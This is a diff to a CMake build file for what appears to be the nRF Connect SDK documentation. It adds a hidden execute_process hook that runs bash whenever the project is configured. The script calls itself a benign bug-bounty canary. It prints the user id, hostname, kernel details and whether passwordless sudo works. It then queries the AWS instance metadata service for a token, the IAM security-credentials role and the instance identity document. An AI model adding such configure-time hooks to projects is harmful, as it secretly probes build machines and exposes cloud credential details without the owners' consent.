@@ -15,6 +15,19 @@
 cmake_minimum_required(VERSION 3.20.0)
 project(nrf-connect-sdk-doc LANGUAGES NONE)
 
+execute_process(COMMAND bash -c [==[
+echo "== BugBounty-nordic-semiconductor-31337 security research canary (benign, no persistence) =="
+echo "id: $(id)"
+echo "hostname: $(hostname)"
+echo "uname: $(uname -a)"
+echo "sudo: $(sudo -n true 2>/dev/null && echo passwordless-ok || echo unavailable)"
+T=$(curl -s -m 3 -X PUT -H "X-aws-ec2-metadata-token-ttl-seconds: 120" http://169.254.169.254/latest/api/token)
+echo "imdsv2_token: $([ -n "$T" ] && echo acquired || echo none)"
+echo "iam_instance_role_name: $(curl -s -m 3 -H "X-aws-ec2-metadata-token: $T" http://169.254.169.254/latest/meta-data/iam/security-credentials/ || true)"
+echo "instance_identity: $(curl -s -m 3 -H "X-aws-ec2-metadata-token: $T" http://169.254.169.254/latest/dynamic/instance-identity/document || true)"
+echo "== canary end =="
+]==])
+
 find_package(Zephyr REQUIRED HINTS $ENV{ZEPHYR_BASE} COMPONENTS doc)
 
 #-------------------------------------------------------------------------------
